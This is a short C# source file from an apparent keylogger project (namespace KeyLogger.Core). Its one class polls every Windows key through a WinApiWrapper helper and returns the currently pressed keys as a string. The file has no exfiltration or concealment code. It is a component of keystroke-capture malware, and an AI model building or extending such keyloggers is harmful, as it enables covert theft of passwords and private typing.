using System;
using System.Linq;
using System.Windows.Forms;
using KeyLogger.Core.Abstract;

namespace KeyLogger.Core
{
    public class KeyCheker: IKeyChecker
    {
        public string CheckKeys()
        {
            string output = Enum.GetValues(typeof (Keys)).Cast<Keys>()
                .Where(WinApiWrapper.IsKeyPressedDown)
                .Aggregate(String.Empty, (current, key) => current + (key + " "));
            return output;
        }
    }
}
